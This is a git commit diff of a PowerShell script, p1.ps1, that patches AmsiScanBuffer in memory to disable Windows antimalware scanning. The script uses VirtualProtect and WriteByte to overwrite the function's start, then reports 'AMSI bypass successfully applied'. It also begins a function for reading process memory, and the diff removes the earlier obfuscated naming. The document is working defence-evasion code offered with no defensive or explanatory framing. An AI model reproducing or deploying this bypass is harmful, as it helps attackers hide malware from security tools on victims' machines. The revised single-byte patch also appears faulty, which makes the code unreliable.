54819f4759fab6feb7d6addc902054ba34f39378
KeyStrOke <KeyStrOke.M95@gmail.com>
2024-11-21 12:08:45 +0100

    Update p1.ps1

--- p1.ps1
+++ p1.ps1
@@ -2,45 +2,42 @@
 $s = @"
 using System;
 using System.Runtime.InteropServices;
-public class A {
-    [DllImport("kernel32")]
+public class AmsiBypass {
+    [DllImport("kernel32.dll")]
     public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    [DllImport("kernel32")]
+    [DllImport("kernel32.dll")]
     public static extern IntPtr LoadLibrary(string name);
-    [DllImport("kernel32")]
+    [DllImport("kernel32.dll")]
     public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 }
 "@
 Add-Type $s
-$a = [A]::LoadLibrary('amsi.dll')
-$b = [A]::GetProcAddress($a, 'AmsiScanBuffer')
-$p = [IntPtr]::Size -eq 8 ? 0x5 : 0x4
-[void][A]::VirtualProtect($b, [uint32]$p, 0x40, [ref]0)
-if ([IntPtr]::Size -eq 8) {
-    [byte[]]@([byte]0xc3) | ForEach-Object { [System.Runtime.InteropServices.Marshal]::WriteByte($b, $_) }
-} else {
-    [byte[]]@([byte]0x33, [byte]0xc0, [byte]0xc3) | ForEach-Object { [System.Runtime.InteropServices.Marshal]::WriteByte($b, $_) }
-}
 
-function M$_Bypass {
-<#
-.Description
-    Obfuscated Function
-#>
+$a = [AmsiBypass]::LoadLibrary('amsi.dll')
+$b = [AmsiBypass]::GetProcAddress($a, 'AmsiScanBuffer')
+$p = [IntPtr]::Size -eq 8 ? 0xC3 : 0x33
+[void][AmsiBypass]::VirtualProtect($b, [uint32]1, 0x40, [ref]0)
+[System.Runtime.InteropServices.Marshal]::WriteByte($b, $p)
 
-param (
-    $I$_Start = 0x50000,
-    $N$_Offset = 0x50000,
-    $M$_Offset = 0x1000000,
-    $R$_Bytes = 0x50000
-)
+Write-Host "[*] AMSI bypass successfully applied."
 
-$O$_API = @"
+# Function Declaration
+function ObfuscatedFunction {
+    param (
+        $InitOffset = 0x50000,
+        $NegOffset = 0x50000,
+        $MaxOffset = 0x1000000,
+        $ReadSize = 0x50000
+    )
+    $APIs = @"
 using System;
 using System.Runtime.InteropServices;
-public class APIs {
+public class ObfAPIs {
     [DllImport("kernel32.dll")]
-    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, ref UInt32 lpNumberOfBytesRead);
+    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, ref uint lpNumberOfBytesRead);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetCurrentProcess();
 }
 "@
-Add-Type $O$_API
+    Add-Type $APIs
+}
